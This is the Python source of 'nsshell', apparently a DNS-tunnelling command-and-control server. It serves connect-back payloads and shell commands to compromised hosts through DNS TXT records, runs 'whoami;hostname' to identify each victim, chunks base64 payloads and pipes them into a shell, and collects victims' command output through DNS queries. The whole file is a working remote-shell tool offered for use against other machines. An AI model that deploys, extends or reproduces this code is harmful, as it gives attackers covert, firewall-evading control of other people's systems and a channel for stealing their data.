#!/usr/bin/env python
#rook

from __future__ import print_function

import base64
import itertools
import random
import Queue
import string
import sys
import subprocess
import re
import os
import datetime
from argparse import ArgumentParser, RawTextHelpFormatter

from twisted.internet import defer, stdio
from twisted.names import dns, server
from twisted.protocols import basic
from twisted.internet import reactor
from requests import get as rget

try:
    #Load from the 'trusted' path that we load everything else from.
    from nsshell.loader import loader
    from nsshell.config import config
except ImportError:
    #This should rarely happen
    #The cwd could contain malicious python libraries which would be executed as root.
    sys.path.append('.')
    from nsshell.loader import loader
    from nsshell.config import config

#The DNS server
#This class is intentionally limited 'client.Resolver' - we don't want an open relay
class ShellResolver:

    def __init__(self, session, ip, hostname, loader):
        self.ip = ip
        self.session = session
        self.hostname = hostname
        self.loader = loader
        self.chunk_keys = map(''.join, itertools.product(string.ascii_letters, repeat=2))

    def lookupAllRecords(self, name="", timeout=0):
        pass

    def query(self, query, timeout=None):
        answers = []
        additional = []
        authority = []
        chunk_cmd = ""
        direct = None
        #8.8.8.8 returns at most 14 txt records per query.
        page_size = 14
        shell_type = "bash"
        query_name = query.name.name
        #query_type = dns.QUERY_TYPES[query.type]
        triggered_payload = False
        cmd_runner = False
        #This is an alternate injection
        #Some sh connectbacks may need this padding.
        if query_name.startswith("{echo,'"):
            query_name=query_name[7:]
            shell_type = "sh"
        #strip of the hostname for this message
        if query_name.endswith(self.hostname):
            name_parts = query_name[0:len(query_name)-len(self.hostname)].split(".")
            #A direct connection must end with our hostname
            direct = False
        else:
            #This is direct because it could not have used an open resolver
            name_parts = query_name.strip(".").split('.')
            direct = True
        #have we seen this session before?
        sess_id = self.session.get_session(name_parts[0])

        #Clients need to resolve the address of this server - here is our root
        if query.type == dns.A:
            #Resolve this server's A record.
            cmd_server = dns.RRHeader(
            name=query.name.name,
            type=dns.A,
            auth=True,
            payload=dns.Record_A(address=self.ip, ttl=0))
            answers.append(cmd_server)
            if not sess_id:
                log("", "", "query", str(datetime.datetime.now())+","+query.name.name+"\n")
        elif query.type == dns.NS:
            #Resolve this server's NS record
            cmd_server = dns.RRHeader(
            name=query.name.name,
            type=dns.NS,
            auth=True,
            payload=dns.Record_NS(self.hostname, ttl=0))
            answers.append(cmd_server)
        #for debugging open resolvers
        #size.x to find the max number of txt records returned.
        elif query.type == dns.TXT and query.name.name.startswith("size"):
            try:
                txt_count = int(query.name.name.split(".")[-1])
            except:
                txt_count = 1
            #Resolve this server's NS record
            cmd_server = dns.RRHeader(
            name=query.name.name,
            type=dns.TXT,
            auth=True,
            payload=dns.Record_TXT("a" * 255, ttl=0))
            for i in range(txt_count):
                answers.append(cmd_server)
            #We are only checking the size.
            return defer.succeed((answers, authority, additional))
        if not sess_id:
            if len(name_parts) > 0:
                if name_parts[0] in self.session.keyspace:
                    #We don't have this session, and it looks like the key will work as a session id.
                    sess_id = self.session.new(name_parts[0])
                else:
                    sess_id = self.session.new()
                    #Did a known payload trigger this request?
                    triggered_payload = self.loader.get_payload(name_parts[0])
                if triggered_payload:
                    self.session.set_data(sess_id, "payload", triggered_payload)
                    trigger_lower = triggered_payload.lower()
                    if trigger_lower.find("bash") >= 0:
                        shell_type = "bash"
                    elif trigger_lower.find("sh") >= 0:
                        shell_type = "sh"
                    elif trigger_lower.find("perl") >= 0:
                        shell_type = "perl"
                    elif trigger_lower.find("cmd") >= 0:
                        shell_type = "cmd"
                    elif trigger_lower.find("powershell") >= 0:
                        shell_type = "ps1"
                else:
                    self.session.set_data(sess_id, "payload", query.name.name)
                self.session.set_data(sess_id, "direct", direct)
                #Direct connections do not have a protocol level limit of the number of results.
                #This cap depends on the implementation of nslookup.
                self.session.set_data(sess_id, "shell_type", shell_type)
        else:
            #Is this a direct connection?
            direct = self.session.get_data(sess_id, "direct")
            shell_type = self.session.get_data(sess_id, "shell_type")
            page_size = self.session.get_data(sess_id, "page_size")
            #These messages conditions need to be checked in all phases of the session
            if self.session.check_exit(sess_id):
                #send exit code
                cmd_runner = "e=1"
            elif not self.session.get_data(sess_id, "host") and direct == None:
                #lets try a direct payload
                direct_sess_id = self.session.new()
                self.loader.get_connect(direct_sess_id, True, shell_type)
                self.session.set_data(direct_sess_id, "direct", True)
                self.session.set_data(direct_sess_id, "shell_type", shell_type)
                self.session.set_data(sess_id, "direct", False)
                cmd_runner = self.loader.get_connect(direct_sess_id, True, shell_type)
            elif not self.session.get_data(sess_id, "host"):
                #Reqeust the machine_id for this new session.
                cmd = "eval 'whoami;hostname'"
                cmd_runner = self.loader.get_runner(sess_id, cmd, direct, shell_type)
            if not self.session.get_data(sess_id, "host"):
                #If we haven't seen this session before,  then we need some kind of identificaiton.
                if len(name_parts) > 1:
                    data = query_name
                    data = "".join(name_parts[1:])
                    try:
                        #Look for a single-block message that contains two newline-seperated elements
                        machine_id = base64.b64decode(data).strip()
                        machine_id = machine_id.split("\n")
                    except:
                        machine_id = False
                    if machine_id and len(machine_id) == 2:
                        new_host = machine_id[1]
                        new_user = machine_id[0]
                        if self.session.new_machine(sess_id, new_user, new_host):
                            message = "new Session: " + sess_id + " - " + new_user + "@"+ new_host +" - payload: " + self.session.get_data(sess_id, "payload")
                            print("\n"+message)
                            log(sess_id, new_host, new_user, message+"\n")
                        else:
                            print("\nkilled duplicate: " + sess_id + " - payload: " + self.session.get_data(sess_id, "payload") + " - restart nsshell if this was a mistake.")
                            #we have tried to exit this host but it reconnected.
                            self.session.send_exit(sess_id)
                        name_parts = []
            else:
                #Send commands
                if query.type == dns.TXT:
                    chunk_cmd = self.session.get_data(sess_id, "chunk_cmd")
                    if not chunk_cmd:
                        cmd = self.session.get_motd(sess_id)
                    else:
                        cmd = False
                    if self.session.get_data(sess_id, "last_read") != 0 and self.session.clear_read(sess_id):
                        #end of read for a command.
                        self.session.indicator(sess_id)
                        self.session.set_data(sess_id, "currently_receiving", False)
                    if cmd and (cmd.lstrip().startswith("cd ") or cmd.lstrip().startswith("eval ") or cmd.lstrip().startswith("export ")):
                        #This command _is_ a true eval
                        if cmd.lstrip().startswith("eval "):
                            cmd = cmd[5:]
                        #pipes spawn a sub-shell which breaks cd, and 'cd' doesn't return anything anyway.
                        #eval the raw command
                        cmd_runner = cmd
                        self.session.indicator(sess_id)
                    elif cmd:
                        cmd_runner = self.loader.get_runner(sess_id, cmd, direct, shell_type)
                        if len(cmd_runner) > 255:
                            chunk_cmd = base64.b64encode(cmd)
                            self.session.set_data(sess_id, "chunk_cmd", chunk_cmd)
                            self.session.set_data(sess_id, "chunk_offset", 0)
                            cmd_runner = ""
                            self.send_chunks(sess_id, answers, query.name.name, direct, shell_type, page_size)
                #Did we get data back from the client?
                elif len(name_parts) > 1 and len(name_parts[1]) > 2 and name_parts[0][2:].isdigit():
                    sequence_number = int(name_parts[0][2:])
                    data = "".join(name_parts[1:])
                    self.session.add_buffer(sess_id, sequence_number, data)
                    #Only print stdout if the user is watching.
                    if self.session.current_session == sess_id:
                        std_data = self.session.read_stdout(sess_id)
                        sys.stdout.write(std_data)
        if chunk_cmd:
            #We still have data, send more pages
            self.send_chunks(sess_id, answers, query.name.name, direct, shell_type, page_size)
        elif cmd_runner:
            if len(cmd_runner) >= 255:
                #Should never happen unless there is a bug with the runner
                print("cmd runner too large:"+str(len(cmd_runner))+">255")
                return
            #We have a new command
            send_commanad = dns.RRHeader(
                name=query.name.name,
                type=dns.TXT,
                payload=dns.Record_TXT(cmd_runner,ttl=0))
            answers.append(send_commanad)
        elif not self.session.get_data(sess_id, "host"):
            full_connect = self.loader.get_connect(sess_id, direct, shell_type)
            if len(full_connect) > 255:
                print('{0} connect payload too large.'.format(len(full_connect)))
            else:
                if len(full_connect) > 255:
                    #should never happen unless there is a bug with the connect back
                    print("connectback too large:"+str(len(full_connect))+">255")
                    return
                #send packaged command to the client
                connect_back_loader=dns.RRHeader(
                    name=query.name.name,
                    type=dns.TXT,
                    payload=dns.Record_TXT(full_connect))
                #"{echo,'"
                answers.append(connect_back_loader)
        sys.stdout.flush()
        return defer.succeed((answers, authority, additional))

    #chunk a command, and execute it.
    def send_chunks(self, sess_id, answers, query_name, direct, shell_type, page_size):
        chunk_runner = ""
        cut_len = 0
        #4 chars of overhead aa=%data%;
        bytes_per_chunk = 255 - 4
        chunk_offset = self.session.get_data(sess_id, "chunk_offset")
        chunk_cmd = self.session.get_data(sess_id, "chunk_cmd")
        chunk_state = self.session.get_data(sess_id, "chunk_state")
        cut = chunk_offset * bytes_per_chunk
        if chunk_state == "+":
            #All chunks sent,  execute them.
            #self.session.set_data(sess_id, "chunk_offset", 0)
            #have we loaded all pages,  now run them
            full = ""
            #Did we process the first page?
            if chunk_offset <= 82:
                #If this is the first page, then zero out the run key.
                chunk_runner = "Z=;"
            #List all variables we used
            keys_used = chunk_offset % 82
            for i in range(keys_used):
                full += "$"+self.chunk_keys[i]
            chunk_runner = chunk_runner + "Z=$Z" + full + ";"
            if cut >= len(chunk_cmd):
                chunk_state = "-"
            else:
                chunk_state = ""
        #we have crunched down all vars,  now execute the full payload
        elif chunk_state == "-":
            run_key = "$Z"
            chunk_runner = self.loader.get_runner(sess_id, "echo "+run_key+"|base64 --decode|"+shell_type, direct, shell_type)
            #all done, good job boys.
            chunk_cmd = ""
            chunk_state = ""
            chunk_offset = 0
        else:# we have data
            while cut < len(chunk_cmd) and len(answers) <= page_size:
                #We can only merge 82 variables with a 255 byte record.
                #Todo improve merging by senidng more data, and then merging all blocks down in one phase.
                if chunk_offset > 0 and chunk_offset % 82 == 0:
                    chunk_offset -= 1
                    chunk_state = "+"
                    break
                key = self.chunk_keys[chunk_offset]
                chunk_offset += 1
                #build a 255 byte chunk
                cut_len = cut + bytes_per_chunk
                new_chunk = key+"="+chunk_cmd[cut:cut_len]+";"
                cut = cut_len
                send_chunk = dns.RRHeader(
                            name=query_name,
                            type=dns.TXT,
                            payload=dns.Record_TXT(new_chunk, ttl=0))
                answers.append(send_chunk)
            #Check if we still have to send data
            if cut >= len(chunk_cmd):
                #All set, run the command.
                chunk_state = "+"
        if chunk_runner:
            run_chunk = dns.RRHeader(
                        name=query_name,
                        type=dns.TXT,
                        payload=dns.Record_TXT(chunk_runner, ttl=0))
            answers.append(run_chunk)
        self.session.set_data(sess_id, "chunk_state", chunk_state)
        self.session.set_data(sess_id, "chunk_offset", chunk_offset)
        self.session.set_data(sess_id, "chunk_cmd", chunk_cmd)

#The data
class session_handler:
    session_index = 0
    current_session = False
    #q is a a session created for testing, and hardcoded in the test files.
    sessions = {}

    def __init__(self, payload_count):
        self.keyspace = map(''.join, itertools.product(string.ascii_letters + string.digits, repeat=2))
        #Payloads will use numbers 0..paylod_count and sessions will be everything other 2 char permutation.
        for x in range(10, payload_count):
            self.keyspace.remove(str(x))
        random.shuffle(self.keyspace)

    def set_motd(self, sess_id, message):
        self.sessions[sess_id]["stdin"].put(message)

    def get_motd(self, sess_id):
        ret = False
        try:
            ret = self.sessions[sess_id]["stdin"].get_nowait()
        except:
            pass
        return ret
    #give us a random unique id for a large number of hosts.
    def generate_id(self):
        id = self.keyspace[self.session_index]
        self.session_index += 1
        return id

    def new(self, new_id = False):
        while not new_id:
            #we could have used this id by a resumed session
            new_id = self.generate_id()
            if new_id in self.sessions:
                new_id = False
        self.sessions[new_id] = {"user": "",
                                 "host": "",
                                #"ip": "",# not sure how to get this....
                                 "direct": None,
                                 "last_req": datetime.datetime.now(),
                                 "stdin": Queue.Queue(),
                                 "stdout": Queue.Queue(),
                                 "bufferd_read": {},
                                 "last_read": 0,
                                 "leftovers": "",
                                 "shell_type":"bash",
                                 "payload":"",
                                 "currently_receiving":False,
                                 "chunk_cmd":"",
                                 "chunk_offset":0,
                                 "chunk_state":"",
                                 "page_size":14,#8.8.8.8 returns at most 14 txt records per query.
                                 "exit": False
                                 }
        return new_id

    def list_sessions(self):
        return self.sessions.keys()

    def check_timeout(self):
        delete = []
        for sess_id in self.sessions:
            #have we gotten a request in the last min?
            #Our shell went away :(
            #Where did it go?
            #Man, I need that fucking shell
            #I know, know, its just gone... but it could still come back
            if self.sessions[sess_id]['last_req'] <= (datetime.datetime.now() - datetime.timedelta(minutes=1)):
                user = self.sessions[sess_id]["user"]
                if not self.sessions[sess_id]["exit"] and user:
                    print("client timed out: " + sess_id + " - " + self.sessions[sess_id]["user"] + '@' \
                          + self.sessions[sess_id]["host"])
                delete.append(sess_id)
        for sess_d in delete:
            del self.sessions[sess_d]

    def get_data(self, sess_id, key):
        return self.sessions[sess_id][key]

    def set_data(self, sess_id, key, val):
        self.sessions[sess_id][key] = val

    def get_session(self, chunk):
        ret=False
        if isinstance(chunk, list) and len(chunk) > 1:
            chunk = chunk[0]
        if len(chunk) > 1 and chunk[0]:
            #first two char only.
            chunk = chunk[0:2]
            ret = False
            for s in self.sessions:
                if chunk == s:
                    ret = s
                    #Update the access time on this session.
                    self.sessions[ret]['last_req'] = datetime.datetime.now()
                    break
        return ret

    def put(self, sess_id, b64):
        self.sessions[sess_id].append(b64)

    def new_machine(self, sess_id, user, host):
        ret = True
        for sess in self.sessions:
            if self.sessions[sess]["user"] == user and self.sessions[sess]["host"] == host and self.check_exit(sess):
                #we must have popped this guy twice.
                ret = False
                break
        #should we limit to just one session?
        #right now we spawn a new session - more shells is better than not enough shells
        self.set_data(sess_id, "user", user)
        self.set_data(sess_id, "host", host)
        return ret

    def send_exit(self, sess_id):
        if sess_id in self.sessions:
            self.sessions[sess_id]["exit"] = True

    #Should this session exit?
    def check_exit(self, sess_id):
        return sess_id in self.sessions and self.sessions[sess_id]["exit"]

    #Check to see if we have all of the data from the client.
    def clear_read(self, sess_id):
        for i in range(0, self.sessions[sess_id]['last_read'] + 10):
            if i in self.sessions[sess_id]["bufferd_read"]:
                return False
        self.sessions[sess_id]['last_read'] = 0
        return True

    def add_buffer(self, sess_id, sequence, data):
        if self.sessions[sess_id]['exit']:
            return
        client_data = ""
        if sequence == 0 and self.clear_read(sess_id):
            self.sessions[sess_id]["currently_receiving"] = True
        self.sessions[sess_id]["bufferd_read"][sequence] = data
        i = self.sessions[sess_id]["last_read"]
        while True:
            if i in self.sessions[sess_id]["bufferd_read"]:
                client_data += self.sessions[sess_id]["bufferd_read"][i]
                del self.sessions[sess_id]["bufferd_read"][sequence]
                i += 1
                self.sessions[sess_id]["last_read"] = i
            else:
                break
        #Do we have data?
        if len(client_data):
            client_data = self.sessions[sess_id]["leftovers"] + client_data
            try:
                #we need some multiple of 4 bytes in order for b64decode to work
                valid_count = len(client_data)/4*4
                decode_total = client_data[0:valid_count]
                decode_total = base64.b64decode(decode_total)
                #Somewhere between 0-3 bytes will remain
                self.sessions[sess_id]["leftovers"] = client_data[valid_count:]
                #we only want to print the current session
                self.sessions[sess_id]['stdout'].put(decode_total)
                log(sess_id, self.sessions[sess_id]["host"],  self.sessions[sess_id]["user"], decode_total)
            except:
                #this should never happen
                print("partial base64 decode error:")
                print(len(decode_total))
                print(decode_total)

    #only print output from the current session
    def read_stdout(self, sess_id):
        ret = ''
        try:
            #break on empty
            while True:
                data = self.sessions[sess_id]['stdout'].get_nowait()
                ret += data
        except Queue.Empty:
            pass
        return ret

    #print shell information to the user.
    def indicator(self, sess_id):
        if sess_id:
            sys.stdout.write(sess_id + '-' + self.sessions[sess_id]["user"] + '@' + self.sessions[sess_id]["host"] + '>')
        else:
            sys.stdout.write('>')

class noResponseServer:
    def gotResolverResponse(self, *args):
        pass

#The UI
class Console(basic.LineReceiver):
    from os import linesep as delimiter
    current_session = None
    current_name = ""
    current_host = ""

    def setSession(self, session):
        self.session = session

    def indicator(self):
        if self.current_session:
            self.transport.write(self.current_session+'-'+self.current_name+'@'+self.current_host+'>')
        else:
            self.transport.write('>')

    def connectionMade(self):
        print("ready")
        self.indicator()

    def lineReceived(self, line):
        line = str(line).strip()
        line_cmd = line.lower()
        #Check for timeouts
        self.session.check_timeout()
        #the current shell may have timed out, sorry m8
        if self.current_session and self.current_session not in self.session.sessions:
            print(self.current_session + " went away :(")
            self.current_session = False
        # Ignore blank lines
        if line:
            lime_cmd_parts=line.split(" ")
            if line_cmd.startswith("quit") or line_cmd.startswith("exit") or line_cmd.startswith("close"):
                if len(lime_cmd_parts) < 2:
                    print("to remove: exit sess_id")
                    print("to exit the server: ctrl+c (clients will still be running)")
                else:
                    self.do_exit(lime_cmd_parts[1])
                self.indicator()
            elif line_cmd == "clear":
                self.do_clear()
                self.indicator()
            elif line_cmd == "help" or line_cmd == "?" or line_cmd == "'help'":
                self.do_help()
                self.indicator()
            elif line_cmd.startswith("session") or line_cmd.startswith("open") or line_cmd.startswith("connect"):
                if len(lime_cmd_parts) < 2:
                    self.do_sessions()
                else:
                    #forgiving - will accept metasploit syntax
                    if lime_cmd_parts[1] == "-i":
                        lime_cmd_parts[1] = lime_cmd_parts[2]
                    self.change_session(lime_cmd_parts[1])
                self.indicator()
            elif self.current_session:
                log(self.current_session, self.current_host, self.current_name, str(datetime.datetime.now())+">"+line+"\n")
                self.session.set_motd(self.current_session, line)
            else:
                print("type 'help' to get a list of commands")
                self.indicator()
            sys.stdout.flush()

    def do_help(self, command=None):
        """help [command]: List commands, or show help on the given command"""
        if command:
            self.sendLine(getattr(self, 'do_' + command).__doc__)
        else:
            commands = [cmd[3:] for cmd in dir(self) if cmd.startswith('do_')]
            self.sendLine("valid commands: " + " ".join(commands))

    def change_session(self, sess_id):
        my_id = self.session.get_session(sess_id)
        if my_id:
            self.current_session = my_id
            self.current_name = self.session.get_data(self.current_session, "user")
            self.current_host = self.session.get_data(self.current_session, "host")
            self.session.current_session = my_id
            std_data = self.session.read_stdout(my_id)
            sys.stdout.write(std_data)
            print("changed to active session:"+sess_id)
        else:
            print("not an active session:"+sess_id)

    def do_sessions(self):
        printed = False
        """sessions: Interact with connected systems."""
        for sess_id in self.session.list_sessions():
            printed=True
            exit_status = self.session.get_data(sess_id, 'exit')
            user = self.session.get_data(sess_id, 'user')
            if not exit_status and user:
                host = self.session.get_data(sess_id, 'host')
                direct = self.session.get_data(sess_id, 'direct')
                last_req = self.session.get_data(sess_id, 'last_req')
                direct = 'direct' if (direct) else 'UDP 53 filtered'
                print(sess_id + " - "+ str(self.session.get_data(sess_id, 'last_req')) + " - "+user+"@" + host + " - " +\
                      self.session.get_data(sess_id, 'payload') + " - " + direct)
        if not printed:
            print("no active sessions")

    def do_clear(self):
        """clear: Clears the console"""
        os.system("clear")

    def do_exit(self, sess_id):
        """exit: exit this session, "exit all" will exit all sessions"""
        if sess_id.lower() == "all":
            for sess_id in self.session.list_sessions():
                self.session.send_exit(sess_id)
            self.current_session = False
            self.session.current_session = False
        else:
            self.session.send_exit(sess_id)
            if self.current_session == sess_id:
                self.current_session = False
                self.session.current_session = False

class Logger(object):
    log_files = {}

    @staticmethod
    def background_log(sess_id, host, user, data, retry = 3):
        sess_id = re.sub(r'\W+', '', sess_id)
        host = re.sub(r'\W+', '', host)
        user = re.sub(r'\W+', '', user)
        log_path = config.LOG_DIR+"/"+sess_id+"_"+host+"_"+user+".log"
        try:
            if log_path not in Logger.log_files:
                Logger.log_files[log_path] = open(log_path, "a")
            Logger.log_files[log_path].write(data)
            Logger.log_files[log_path].flush()
        except: # TODO make this more specific, eating all errors bad
            #just to be safe, lets make sure we wrote it.
            if retry >= 1:
                return Logger.background_log(sess_id, host, user, data, retry - 1)

def log(sess_id, host, user, data):
    reactor.callInThread(Logger.background_log, sess_id, host, user, data)

def main():
    """
    Run the server.
    """
    argparser = ArgumentParser(description='nsshell.py HOST IP\nnsshell.py localhost 127.0.0.1', formatter_class=RawTextHelpFormatter)
    argparser.add_argument('hostname',
        default=str(subprocess.check_output(['hostname','-f'])).strip(),
        nargs='?',
        help='hostname of the publicly facing server, for debugging=localhost',
        type=str)
    argparser.add_argument('ip',
        default='',
        nargs='?',
        help='ip addr of publicly facing server',
        type=str)
    config_args = argparser.add_argument_group(title='Config Args')
    config_args.add_argument('--logdir',
        action='store',
        default='',
        dest='logdir',
        help='set logging directory')

    if len(sys.argv) <= 2:
        argparser.print_help()
        sys.exit(1)

    args = vars(argparser.parse_args())

    # check to see if logging has been disabled
    if args['logdir'].lower() in config.CLI_NO:
        config.LOG_DIR = None
    elif args['logdir']:
        config.LOG_DIR = os.path.realpath(args['logdir'])
    if config.LOG_DIR and not os.path.exists(config.LOG_DIR):
            os.makedirs(config.LOG_DIR)

    hostname = args['hostname']
    ip = args['ip']

    if len(ip) > 12:
        sys.stderr.write("Must be ipv4:"+args['ip'])
        sys.exit(1)

    print("Starting nsshell - DO NOT DISTRIBUTE")
    print("using hostname: " + hostname)
    print("using IP: " + ip)
    if config.LOG_DIR:
        print("logging to: " + config.LOG_DIR)

    load = loader(hostname, ip)
    payload_count = len(load.payloads)
    #payload_count is used to prevent session IDs and payloads from sharing the same keys.
    sessionhandler = session_handler(payload_count)
    sr = ShellResolver(sessionhandler, ip, hostname, load)
    console_handler = Console()
    console_handler.setSession(sessionhandler)

    #The torando DNS server will throw a harmless exception when scanned by nmap.
    #We are overriding gotResolverResponse with a lambda to avoid this exception:
    #File "/usr/lib/python2.7/dist-packages/twisted/names/server.py", line 263, in gotResolverResponse
    #    def gotResolverResponse(self, (ans, auth, add), protocol, message, address):
    #exceptions.TypeError: 'NoneType' object is not iterable
    server.gotResolverResponse = lambda *x: False
    factory = server.DNSServerFactory(
        clients=[sr]
        #We don't want to be an open resolver:
        #, client.Resolver(resolv='/etc/resolv.conf')]
    )
    protocol = dns.DNSDatagramProtocol(controller=factory)
    print("binding udp/53")
    reactor.listenUDP(53, protocol)
    print("binding tcp/53")
    reactor.listenTCP(53, factory)

    with open('payloads.txt','w') as f:
        for payload in load.build_payloads():
            f.write(payload+"\n")
    print("wrote connect-back payloads to:payloads.txt")
    stdio.StandardIO(console_handler)
    reactor.run()

if __name__ == '__main__':
    raise SystemExit(main())
